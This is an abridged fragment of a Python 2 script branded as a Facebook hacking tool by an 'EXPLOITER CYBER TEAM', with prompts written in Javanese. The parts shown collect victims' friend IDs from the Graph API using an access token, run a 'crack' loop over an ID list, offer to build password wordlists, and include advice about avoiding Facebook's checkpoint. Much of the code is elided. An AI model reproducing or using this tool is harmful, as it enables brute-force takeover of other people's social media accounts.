...
logo = "•••[✓] Tools Hack Fb By Bahauddin EXPLOITER CYBER TEAM 2020 [✓]•••"  '\n\x1b[1;92m[*] monggo masuk disek neng operamini cuk ben ora Checkpoint\n'
print '║-> \x1b[1;37;40mtest'
def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
...
def mini():
    ...
    try:
        ...
        try:
            ...
            print '\x1b[1;91m[!] Terget ora ntuk cuk'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
            menu_hack()
...
def crack():
    ...
    try:
        ...
        print '\x1b[1;91m[!] Token ora ono cuk'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()
    else:
        ...
        try:
            file = open(idlist, 'r')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mnteni wae sabar \x1b[1;97m...')
            for x in range(40):
...
def pilih_super():
    ...
    if peak == '':
        ...
        if peak == '1':
            ...
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            jalan('\x1b[1;91m[+] \x1b[1;92mnjikuk id Teman \x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
    ...
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mdi tunggu wae cuk \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
...
def tanyaw():
    why = raw_input('\x1b[1;91m[?] \x1b[1;92msampean pingin gawe  wordlist ? \x1b[1;92m[y/t]\x1b[1;91m:\x1b[1;97m ')
    if why == '':
        print '\x1b[1;91m[!] monggo di Pilih \x1b[1;97m(y/t)'
        tanyaw()
    else:
        if why == 'y':
            wordlist()
        ...
        if go == '1':
            ...
            if go == '2':
                ...
                if go == '0':
                    ...
                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + go + ' \x1b[1;91mora di temokno cuk'
                    yahoo_pilih()
